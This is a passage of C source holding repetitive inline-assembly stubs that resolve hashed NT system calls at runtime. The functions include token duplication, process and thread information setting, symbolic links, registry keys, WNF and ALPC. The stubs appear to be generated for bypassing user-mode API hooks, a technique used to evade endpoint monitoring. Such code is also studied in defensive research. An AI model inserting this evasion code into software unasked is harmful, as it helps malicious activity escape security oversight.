        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtDeleteFile(
    IN POBJECT_ATTRIBUTES ObjectAttributes)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x64B26A1A \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x64B26A1A \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtTerminateProcess(
    IN HANDLE ProcessHandle OPTIONAL,
    IN NTSTATUS ExitStatus)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x652E64A0 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x652E64A0 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtSetInformationProcess_(
    IN HANDLE DeviceHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG Length)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x1D9F320C \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x1D9F320C \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtQueryInformationToken(
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    OUT PVOID TokenInformation,
    IN ULONG TokenInformationLength,
    OUT PULONG ReturnLength)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x27917136 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x27917136 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtDuplicateToken(
    IN HANDLE ExistingTokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN EffectiveOnly,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE NewTokenHandle)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x099C8384 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x099C8384 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtSetInformationThread(
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    IN PVOID ThreadInformation,
    IN ULONG ThreadInformationLength)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x1ABE5F87 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x1ABE5F87 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtCreateDirectoryObjectEx(
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ShadowDirectoryHandle,
    IN ULONG Flags)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xBCBD62EA \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xBCBD62EA \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtCreateSymbolicLinkObject(
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING LinkTarget)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x8AD1BA6D \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x8AD1BA6D \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtOpenSymbolicLinkObject(
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x8C97980F \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x8C97980F \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtQuerySymbolicLinkObject(
    IN HANDLE LinkHandle,
    IN OUT PUNICODE_STRING LinkTarget,
    OUT PULONG ReturnedLength OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xA63A8CA7 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xA63A8CA7 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtCreateSection(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xF06912F9 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xF06912F9 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtOpenThreadToken(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    OUT PHANDLE TokenHandle)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x73A33918 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x73A33918 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtCreateTransaction(
    OUT PHANDLE TransactionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN LPGUID Uow OPTIONAL,
    IN HANDLE TmHandle OPTIONAL,
    IN ULONG CreateOptions OPTIONAL,
    IN ULONG IsolationLevel OPTIONAL,
    IN ULONG IsolationFlags OPTIONAL,
    IN PLARGE_INTEGER Timeout OPTIONAL,
    IN PUNICODE_STRING Description OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x7CAB5EFB \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x7CAB5EFB \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtQueryInformationFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x38985C1E \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x38985C1E \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtMakeTemporaryObject(
    IN HANDLE Handle)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x84DF4D82 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x84DF4D82 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtCreateKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG TitleIndex,
    IN PUNICODE_STRING Class OPTIONAL,
    IN ULONG CreateOptions,
    OUT PULONG Disposition OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xA1B2860C \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xA1B2860C \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN ULONG TitleIndex OPTIONAL,
    IN ULONG Type,
    IN PVOID SystemData,
    IN ULONG DataSize)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x0A1F2D80 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x0A1F2D80 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtQueryWnfStateNameInformation(
    IN PVOID StateName,
    IN ULONG NameInfoClass,
    IN PVOID ExplicitScope OPTIONAL,
    OUT PVOID InfoBuffer,
    IN ULONG InfoBufferSize)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x14823613 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x14823613 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtUpdateWnfStateData(
    IN PVOID StateName,
    IN PVOID Buffer OPTIONAL,
    IN ULONG Length OPTIONAL,
    IN PCWNF_TYPE_ID TypeId OPTIONAL,
    IN PVOID ExplicitScope OPTIONAL,
    IN WNF_CHANGE_STAMP MatchingChangeStamp,
    IN ULONG CheckStamp)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xE63DF28A \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0xE63DF28A \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtOpenEvent(
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x32A83D3A \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x32A83D3A \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtAlpcConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PALPC_PORT_ATTRIBUTES PortAttributes OPTIONAL,
    IN ULONG Flags,
    IN PSID RequiredServerSid OPTIONAL,
    IN OUT PVOID ConnectionMessage OPTIONAL,
    IN OUT PULONG BufferLength OPTIONAL,
    IN OUT PALPC_MESSAGE_ATTRIBUTES OutMessageAttributes OPTIONAL,
    IN OUT PALPC_MESSAGE_ATTRIBUTES InMessageAttributes OPTIONAL,
    IN PLARGE_INTEGER Timeout OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x6AF3595C \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        "push 0x6AF3595C \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW2_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

__declspec(naked) NTSTATUS NtAlpcSendWaitReceivePort(
    IN HANDLE PortHandle,
    IN ULONG Flags,
    IN PPORT_MESSAGE SendMessage OPTIONAL,
    IN OUT PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes OPTIONAL,
    OUT PPORT_MESSAGE ReceiveMessage OPTIONAL,
    IN OUT PSIZE_T BufferLength OPTIONAL,
    IN OUT PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes OPTIONAL,
    IN PLARGE_INTEGER Timeout OPTIONAL)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0xE830236E \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW2_GetSyscallNumber \n"
